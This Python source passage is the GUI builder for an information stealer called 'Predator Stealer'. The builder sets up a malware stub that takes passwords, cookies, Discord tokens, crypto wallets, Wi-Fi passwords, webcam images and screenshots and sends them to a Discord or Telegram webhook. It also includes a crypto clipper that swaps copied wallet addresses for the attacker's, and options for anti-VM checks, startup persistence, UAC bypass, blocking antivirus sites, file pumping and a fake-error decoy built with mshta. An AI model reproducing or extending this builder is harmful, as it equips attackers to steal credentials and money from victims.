#         # self.captureScreenshotCheckboxControl = customtkinter.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureScreenshotVar)
#         # self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)

#         # self.captureTelegramChecboxControl = customtkinter.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureTelegramVar)
#         # self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)

#         # self.captureCommonFilesChecboxControl = customtkinter.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
#         # self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)

#         # self.fakeErrorCheckboxControl = customtkinter.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
#         # self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)

#         # self.blockAvSitesCheckboxControl = customtkinter.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
#         # self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)

#         # self.discordInjectionCheckboxControl = customtkinter.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.discordInjectionVar)
#         # self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)

#         # self.uacBypassCheckboxControl = customtkinter.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.uacBypassVar)
#         # self.uacBypassCheckboxControl.grid(row= 4, column= 4, sticky= "w", padx= 20)

#         # self.C2ModeButtonControl = customtkinter.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.C2ModeButtonControl_Callback)
#         # self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))

#         # self.bindExeButtonControl = customtkinter.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback)
#         # self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))

#         # self.selectIconButtonControl = customtkinter.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
#         # self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))

#         # self.buildModeButtonControl = customtkinter.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
#         # self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))

#         # self.consoleModeButtonControl = customtkinter.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
#         # self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))

#         # self.buildButtonControl = customtkinter.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
#         # self.buildButtonControl.grid(row= 6, column= 5, sticky= "ew", padx= (0, 15))


class PumperSettings(customtkinter.CTkToplevel):

    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("Stealer [File Pumper]")
        self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        self.grab_set()
        self.geometry("500x200")
        self.resizable(False, False)
        
        self.limit = 0
        self.limitVar = customtkinter.StringVar(self, value= str(self.limit))
        self.font = customtkinter.CTkFont(size= 18)

        self.rowconfigure(0, weight= 1)
        self.rowconfigure(1, weight= 1)
        self.rowconfigure(2, weight= 1)

        self.columnconfigure(0, weight= 1)
        self.columnconfigure(1, weight= 1)
        self.columnconfigure(2, weight= 1)

        noteLabel = customtkinter.CTkLabel(self, text= "Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.", font= self.font)
        noteLabel.grid(row= 0, column= 0, columnspan= 3, padx= 10)

        limitEntry = customtkinter.CTkEntry(self, text_color= "white", textvariable= self.limitVar, font= self.font)
        limitEntry.grid(row= 1, column= 1, padx= 10, pady= 10)
        limitEntry.bind("<KeyRelease>", self.on_limit_change)

        self.okButton = customtkinter.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "light green", text_color_disabled= "white", command= self.ok_Event)
        self.okButton.grid(row= 2, column= 1, padx= 10, pady= 10)

    def ok_Event(self) -> None:
        if self.limitVar.get().isdigit():
            self.limit = int(self.limitVar.get())
            self.destroy()
        else:
            messagebox.showerror("Error", "The size should be a positive number!")
    
    def on_limit_change(self, _):
        limitBoxText = self.limitVar.get()
        if limitBoxText.isdigit():
            self.okButton.configure(state= "normal")
            self.okButton.configure(fg_color= "green")
        else:
            self.okButton.configure(state= "disabled")
            self.okButton.configure(fg_color= "red")
    
class FakeErrorBuilder(customtkinter.CTkToplevel):

    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("Predator Stealer [Fake Error Builder]")
        self.iconbitmap(os.path.join("core", "logo.ico"))
        self.grab_set()
        self.geometry("833x563")
        self.resizable(True, False)


        self.master = master
        self.font = customtkinter.CTkFont(size= 20)

        self.rowconfigure((0,1,2,3,4,5,6,7), weight= 1)
        self.rowconfigure(8, weight= 2)
        self.columnconfigure(1, weight= 1)

        self.iconVar = customtkinter.IntVar(self, value= 0)

        self.titleEntry = customtkinter.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= self.font)
        self.titleEntry.grid(row = 0, column= 1, padx= 20, sticky= "ew", columnspan= 2)

        self.messageEntry = customtkinter.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= self.font)
        self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)

        self.iconChoiceSt = customtkinter.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= self.font)
        self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 20)

        self.iconChoiceQn = customtkinter.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= self.font)
        self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 20)

        self.iconChoiceWa = customtkinter.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= self.font)
        self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 20)

        self.iconChoiceIn = customtkinter.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= self.font)
        self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 20)

        self.testButton = customtkinter.CTkButton(self, text= "Test", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
        self.testButton.grid(row= 4, column= 2, padx= 20)

        self.saveButton = customtkinter.CTkButton(self, text= "Save", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
        self.saveButton.grid(row= 5, column= 2, padx= 20)
    
    def testFakeError(self) -> None:
        title= self.titleEntry.get()
        message= self.messageEntry.get()
        icon= self.iconVar.get()

        if title.strip() == "":
            title= "Title"
            self.titleEntry.insert(0, title)
        
        if message.strip() == "":
            message= "Message"
            self.messageEntry.insert(0, message)
        
        cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
        subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    def saveFakeError(self) -> None:
        title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
        message= self.messageEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")

        icon= self.iconVar.get()

        if title.strip() == message.strip() == "":
            self.master.fakeErrorData = [False, ("", "", 0)]
            self.destroy()

        elif title.strip() == "":
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
            subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return
        
        elif message.strip() == "":
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
            subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return
        
        self.master.fakeErrorData = [True, (title, message, icon)]
        self.destroy()

class StealerBuilder(customtkinter.CTkToplevel):
    def __init__(self):

        super().__init__()

        self.icon_name = ""
        self.pingtype = "none"
        
        self.iconname = "core/logo.ico"

        self.title("Stealer [BETA]")
        self.geometry("720x460")
        self.iconbitmap("core/logo.ico")
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.wm_iconphoto(False, mainico)
        self.attributes("-topmost", True)
        self.minsize(520, 400)

        self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
        self.pumpLimit = 0 # Bytes

        self.pingMeVar = customtkinter.BooleanVar(self)
        self.vmProtectVar = customtkinter.BooleanVar(self)
        self.startupVar = customtkinter.BooleanVar(self)
        self.meltVar = customtkinter.BooleanVar(self)
        self.fakeErrorVar = customtkinter.BooleanVar(self)
        self.blockAvSitesVar = customtkinter.BooleanVar(self)
        self.discordInjectionVar = customtkinter.BooleanVar(self)
        self.uacBypassVar = customtkinter.BooleanVar(self)
        self.pumpStubVar = customtkinter.BooleanVar(self)

        self.captureWebcamVar = customtkinter.BooleanVar(self)
        self.capturePasswordsVar = customtkinter.BooleanVar(self)
        self.captureCookiesVar = customtkinter.BooleanVar(self)
        self.captureHistoryVar = customtkinter.BooleanVar(self)
        self.captureAutofillsVar = customtkinter.BooleanVar(self)
        self.captureDiscordTokensVar = customtkinter.BooleanVar(self)
        self.captureGamesVar = customtkinter.BooleanVar(self)
        self.captureWifiPasswordsVar = customtkinter.BooleanVar(self)
        self.captureSystemInfoVar = customtkinter.BooleanVar(self)
        self.captureScreenshotVar = customtkinter.BooleanVar(self)
        self.captureTelegramVar = customtkinter.BooleanVar(self)
        self.captureCommonFilesVar = customtkinter.BooleanVar(self)
        self.captureWalletsVar = customtkinter.BooleanVar(self)
        
        self.boundExePath = ""
        self.boundExeRunOnStartup = False
        self.iconBytes = ""

        self.OutputAsExe = True
        self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
        self.C2Mode = 1 # 0 = Discord, 1 = Telegram

        #base
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "core/images")
        self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(60, 60))
        self.gif = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(300, 300))
        self.options = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_options.png")), dark_image=Image.open(os.path.join(image_path, "d_options.png")), size=(20, 20))
        self.crypto = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_crypto.png")), dark_image=Image.open(os.path.join(image_path, "d_crypto.png")), size=(20, 20))
        self.files = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_files.png")), dark_image=Image.open(os.path.join(image_path, "d_files.png")), size=(20, 20))
        self.build_img = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_build.png")),dark_image=Image.open(os.path.join(image_path, "d_build.png")), size=(20, 20))
        self.about = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_about.png")), dark_image=Image.open(os.path.join(image_path, "d_about.png")), size=(20, 20))

        self.nav_frame = customtkinter.CTkFrame(self, border_color="red", border_width=2)
        self.nav_frame.grid(row=0, column=0)
        # self.nav_frame.grid_rowconfigure(5, weight=1)
        # self.nav_frame.grid_columnconfigure(0, weight=1)

        self.crypto_frame = customtkinter.CTkScrollableFrame(self, border_color="red", border_width=2)
        self.crypto_frame.grid_columnconfigure(0, weight=1)
        # self.crypto_frame.grid_rowconfigure((0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17), weight=1)

        self.build_frame = customtkinter.CTkFrame(self, border_color="red", border_width=2)
        self.build_frame.grid_columnconfigure(0, weight=1)
        self.build_frame.grid_rowconfigure(1, weight=1)

        self.file_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.file_frame.grid_columnconfigure(0, weight=1)
        self.file_frame.grid_rowconfigure(0, weight=1)

        self.about_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)

        #Nav Bar
        self.nav_label = customtkinter.CTkLabel(self.nav_frame, text="", image=self.logo, compound="left", font=customtkinter.CTkFont(size=60, weight="bold"))
        self.nav_label.pack()

        self.option_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="General", fg_color="transparent", image=self.options, anchor="w", command=self.option_event)
        self.option_button.pack()

        self.crypto_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Crypto Clipper", fg_color="transparent", image=self.crypto, anchor="w", command=self.crypto_event)
        self.crypto_button.pack()

        self.file_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Functions", fg_color="transparent", image=self.files, anchor="w", command=self.file_event)
        self.file_button.pack()

        self.build_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="Build", fg_color="transparent", image=self.build_img, anchor="w", command=self.build_event)
        self.build_button.pack()

        self.about_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="About", fg_color="transparent", image=self.about, anchor="w",command=self.about_event)
        self.about_button.pack()

        # self.builderOptions = BuilderOptionsFrame(self.options_frame)
        # self.builderOptions.grid(row=0, column=0, sticky="nsew", pady=(10,10), padx=(10,10))

        self.options_frame = customtkinter.CTkFrame(self, border_color="red", border_width=2)
        self.options_frame.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)
        self.options_frame.grid_columnconfigure(0, weight=1)
        # self.options_frame.grid_rowconfigure((0,1), weight=1)

        # self.C2EntryName = customtkinter.CTkLabel(master=self.options_frame, text="Webhook", font=customtkinter.CTkFont(size=16, weight="bold"), text_color="red")
        # self.C2EntryName.grid(row=0, column=0)

        try:
            with open('core/settings.json', 'r', encoding='utf-8') as stDB:
                stdB = json.load(stDB)
                # TelegramVar = (stdB['telegram'])
                DiscordVar = (stdB['discord'])
        except Exception as err:
            console.print_exception(show_locals=True)
            Predator.show_error('', 'Exception!', err)
            DiscordVar = "Enter Discord Webhook Here"

        Discord_var = customtkinter.StringVar(value=DiscordVar)
        self.C2EntryControl = customtkinter.CTkEntry(self.options_frame, placeholder_text="Enter Discord Webhook Here", textvariable=Discord_var)
  
        self.C2EntryControl.grid(row=0, column=0, sticky="ew", padx=(10,0), pady=5)

        self.testC2ButtonControl = customtkinter.CTkButton(self.options_frame, text="Test Webhook", command=lambda: Thread(target=self.testC2ButtonControl_Callback).start())
        self.testC2ButtonControl.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

        self.stbtnsFrame = customtkinter.CTkFrame(self.options_frame)
        self.stbtnsFrame.grid(row=1, column=0, padx=5, columnspan=2, sticky="nsew")
        self.stbtnsFrame.grid_columnconfigure(0, weight=1)

        self.C2ModeButtonControl = customtkinter.CTkButton(self.stbtnsFrame, text="C2: Discord", command=self.C2ModeButtonControl_Callback)
        self.C2ModeButtonControl.grid(row=0, column=0, sticky="nsew", pady=2)

        self.bindExeButtonControl = customtkinter.CTkButton(self.stbtnsFrame, text="Bind Executable", command=self.bindExeButtonControl_Callback)
        self.bindExeButtonControl.grid(row=1, column=0, sticky="nsew", pady=2)

        self.selectIconButtonControl = customtkinter.CTkButton(self.stbtnsFrame, text="Select Icon", command=self.selectIconButtonControl_Callback)
        self.selectIconButtonControl.grid(row=2, column=0, sticky="nsew", pady=2)

        self.buildModeButtonControl = customtkinter.CTkButton(self.stbtnsFrame, text= "Output: EXE File", command=self.buildModeButtonControl_Callback)
        self.buildModeButtonControl.grid(row=3, column=0, sticky="nsew", pady=2)

        self.consoleModeButtonControl = customtkinter.CTkButton(self.stbtnsFrame, text= "Console: None", command=self.consoleModeButtonControl_Callback)
        self.consoleModeButtonControl.grid(row=4, column=0, sticky="nsew", pady=2)



        # #Options category
        # self.w3bh00k_name = customtkinter.CTkLabel(master=self.options_frame, text="Webhook")
        # self.w3bh00k_name.grid(row=1, column=0, columnspan=2, padx=10, pady=(10, 0))

        # self.w3bh00k_input = customtkinter.CTkEntry(self.options_frame, width=420, placeholder_text="Bot Token [token:ChatID]")
        # self.w3bh00k_input.grid(row=2, column=0, columnspan=2, padx=40, pady=(0, 12))

        self.BtnsFrame = customtkinter.CTkFrame(self, corner_radius=0)
        self.BtnsFrame.grid(row=0, column=2, sticky="nsew")
        self.BtnsFrame.grid_rowconfigure(0, weight=1)
        self.BtnsFrame.grid_columnconfigure(0, weight=1)

        self.next_option_button = customtkinter.CTkButton(self.BtnsFrame, corner_radius=0, width=20, text=">>", command=self.crypto_event, compound="right")
        self.next_option_button.grid(row=0, column=0, sticky="nsew")

        #Crypto category
        crypto_names = ["Bitcoin", "[ETH, BNB...]", "[USDT, TRX]", "LTC", "Monero", "Ada/Cardano", "Dash", "DGB", "SOL", "BCH", "ZCASH", "XRP"]

        for i, name in enumerate(crypto_names):
            crypto_label = customtkinter.CTkLabel(master=self.crypto_frame, text=name)
            crypto_label.grid(row=2 * i + 2, column=0, sticky="nsew", columnspan=2, padx=10, pady=0)

        try:
            with open('core/Stealer/Clipper.json', 'r', encoding='utf-8') as stDB:
                sealerdB = json.load(stDB)
                # TelegramVar = (stdB['telegram'])
                ClipperBTC = (sealerdB['ClipperBTC'])
                ClipperCOMBO = (sealerdB['ClipperCOMBO'])
                ClipperTRC20 = (sealerdB['ClipperTRC20'])
                ClipperLTC = (sealerdB['ClipperLTC'])
                ClipperMonero = (sealerdB['ClipperMonero'])
                ClipperAda = (sealerdB['ClipperAda'])
                ClipperDash = (sealerdB['ClipperDash'])
                ClipperDGB = (sealerdB['ClipperDGB'])
                ClipperSOL = (sealerdB['ClipperSOL'])
                ClipperBCH = (sealerdB['ClipperBCH'])
                ClipperZCASH = (sealerdB['ClipperZCASH'])
                ClipperXRP = (sealerdB['ClipperXRP'])
        except Exception as err:
            console.print_exception(show_locals=True)
            Predator.show_error('', 'Exception!', err)

        
        # self.active = customtkinter.CTkCheckBox(self.crypto_frame, text="Replace all copied crypto address wallet by your address", onvalue='yes', offvalue='no')
        # self.active.grid(row=1, column=0, sticky="nsew", padx=40, pady=10)
        self.active = customtkinter.CTkSwitch(self.crypto_frame, text="Enable", onvalue='yes', offvalue='no')
        self.active.grid(row=1, column=0, sticky="nsew", padx=40, pady=10)

        self.SaveCliper = customtkinter.CTkButton(self.crypto_frame, text="Save", height=16, command=self.saveClipper)
        self.SaveCliper.grid(row=1, column=1)
        
        self.btc_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Bitcoin Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperBTC))
        self.btc_input.grid(row=3, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.combo_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperCOMBO))
        self.combo_input.grid(row=5, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.trc20_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperTRC20))
        self.trc20_input.grid(row=7, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.ltc_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your P-Chain Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperLTC))
        self.ltc_input.grid(row=9, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.monero_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Monero Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperMonero))
        self.monero_input.grid(row=11, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.ada_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Ada/Cardano Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperAda))
        self.ada_input.grid(row=13, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.dash_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your Dash Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperDash))
        self.dash_input.grid(row=15, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.dgb_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your DGB Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperDGB))
        self.dgb_input.grid(row=17, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))

        self.sol_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your SOL Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperSOL))
        self.sol_input.grid(row=19, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))
  
        self.bch_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your BCH Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperBCH))
        self.bch_input.grid(row=21, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))
        
        self.zcash_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your ZCASH Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperZCASH))
        self.zcash_input.grid(row=23, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))
        
        self.xrp_input = customtkinter.CTkEntry(self.crypto_frame, width=420, placeholder_text="Your XRP Address (let empty if you do not have)", textvariable=customtkinter.StringVar(value=ClipperXRP))
        self.xrp_input.grid(row=25, column=0, sticky="nsew", columnspan=2, padx=40, pady=(0, 10))
  
        # self.next_crypto_button = customtkinter.CTkButton(self.crypto_frame, width=120, height=30, text="Next", command=self.file_event, compound="right")
        # self.next_crypto_button.grid(row=17, column=2, padx=40, pady=0)
        self.funcsFrame = customtkinter.CTkScrollableFrame(self.file_frame, border_color="red", border_width=2)
        self.funcsFrame.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)
        self.funcsFrame.grid_columnconfigure((0,1), weight=1)

        #File category

        self.pingMeCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Ping Me", variable=self.pingMeVar)
        self.pingMeCheckboxControl.grid(row=0, column=0, sticky="nsew", padx=5)

        # self.browsers_button = customtkinter.CTkCheckBox(self.funcsFrame,text="Steal Browsers Files (Cookies/Password/etc...)", onvalue='yes', offvalue='no')
        # self.browsers_button.grid(row=0, column=0, sticky="nsew", pady=5)

        self.vmProtectCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Anti VM", variable=self.vmProtectVar)
        self.vmProtectCheckboxControl.grid(row=0, column=1, sticky="nsew", pady=5)

        # self.antivirus_button = customtkinter.CTkCheckBox(self.funcsFrame,text="Steal all anti virus informations", onvalue='yes', offvalue='no')
        # self.antivirus_button.grid(row=0, column=1, sticky="nsew", pady=5)

        self.startupCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Put On Startup", variable=self.startupVar)
        self.startupCheckboxControl.grid(row=1, column=0, sticky="nsew", pady=5)

        # self.mc_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Steal all minecraft app tokens", onvalue='yes', offvalue='no')
        # self.mc_button.grid(row=1, column=0, sticky="nsew", pady=5)

        self.meltCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Melt Stub", variable=self.meltVar)
        self.meltCheckboxControl.grid(row=1, column=1, sticky="nsew", pady=5)

        # self.sys_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Steal systeme informations", onvalue='yes', offvalue='no')
        # self.sys_button.grid(row=1, column=1, sticky="nsew", pady=5)

        self.pumpStubCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Pump Stub", command=self.pumpStub_Event, variable=self.pumpStubVar)
        self.pumpStubCheckboxControl.grid(row=2, column=0, sticky="nsew", pady=5)

        # self.roblox_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Steal roblox app token",onvalue='yes', offvalue='no')
        # self.roblox_button.grid(row=2, column=0, sticky="nsew", pady=5)

        self.captureWebcamCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Webcam", variable=self.captureWebcamVar)
        self.captureWebcamCheckboxControl.grid(row=2, column=1, sticky="nsew", pady=5)

        # self.screen_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Take screenshot", onvalue='yes', offvalue='no')
        # self.screen_button.grid(row=2, column=1, sticky="nsew", pady=5)

        self.capturePasswordsCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Passwords", variable=self.capturePasswordsVar)
        self.capturePasswordsCheckboxControl.grid(row=3, column=0, sticky="nsew", pady=5)

        # self.last_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Steal latest clipboard", onvalue='yes', offvalue='no')
        # self.last_button.grid(row=3, column=0, sticky="nsew", pady=5)

        self.captureCookiesCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Cookies", variable=self.captureCookiesVar)
        self.captureCookiesCheckboxControl.grid(row=3, column=1, sticky="nsew", pady=5)

        # self.wifi_button = customtkinter.CTkCheckBox(self.funcsFrame, text="Steal all wifi passwords", onvalue='yes', offvalue='no')
        # self.wifi_button.grid(row=3, column=1, sticky="nsew", pady=5)

        self.captureHistoryCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="History", variable=self.captureHistoryVar)
        self.captureHistoryCheckboxControl.grid(row=4, column=0, sticky="nsew", pady=5)

        self.captureAutoFillCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Autofills", variable=self.captureAutofillsVar)
        self.captureAutoFillCheckboxControl.grid(row=4, column=1, sticky="nsew", pady=5)

        self.captureDiscordTokensCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Discord Tokens", variable=self.captureDiscordTokensVar)
        self.captureDiscordTokensCheckboxControl.grid(row=5, column=0, sticky="nsew", pady=5)

        self.captureGamesCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Games", variable=self.captureGamesVar)
        self.captureGamesCheckboxControl.grid(row=5, column=1, sticky="nsew", pady=5)

        self.captureWalletsCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Wallets", variable=self.captureWalletsVar)
        self.captureWalletsCheckboxControl.grid(row=6, column=0, sticky="nsew", pady=5)

        self.captureWifiPasswordsCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Wifi Passwords", variable= self.captureWifiPasswordsVar)
        self.captureWifiPasswordsCheckboxControl.grid(row=6, column=1, sticky="nsew", pady=5)

        self.captureSysteminfoCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="System Info", variable=self.captureSystemInfoVar)
        self.captureSysteminfoCheckboxControl.grid(row=7, column=0, sticky="nsew", pady=5)

        self.captureScreenshotCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Screenshot", variable=self.captureScreenshotVar)
        self.captureScreenshotCheckboxControl.grid(row=7, column=1, sticky="nsew", pady=5)

        self.captureTelegramChecboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Telegram", variable=self.captureTelegramVar)
        self.captureTelegramChecboxControl.grid(row=8, column=0, sticky="nsew", pady=5)

        self.captureCommonFilesChecboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Common Files", variable=self.captureCommonFilesVar)
        self.captureCommonFilesChecboxControl.grid(row=8, column=1, sticky="nsew", pady=5)

        self.fakeErrorCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Fake Error", command=self.fakeError_Event, variable=self.fakeErrorVar)
        self.fakeErrorCheckboxControl.grid(row=9, column=0, sticky="nsew", pady=5)

        self.blockAvSitesCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text="Block AV Sites", variable=self.blockAvSitesVar)
        self.blockAvSitesCheckboxControl.grid(row=9, column=1, sticky="nsew", pady=5)

        self.discordInjectionCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text= "Discord Injection", variable=self.discordInjectionVar)
        self.discordInjectionCheckboxControl.grid(row=10, column=0, sticky="nsew", pady=5)

        self.uacBypassCheckboxControl = customtkinter.CTkCheckBox(self.funcsFrame, text= "UAC Bypass", variable=self.uacBypassVar)
        self.uacBypassCheckboxControl.grid(row=10, column=1, sticky="nsew", pady=5)

        #Select button defaut
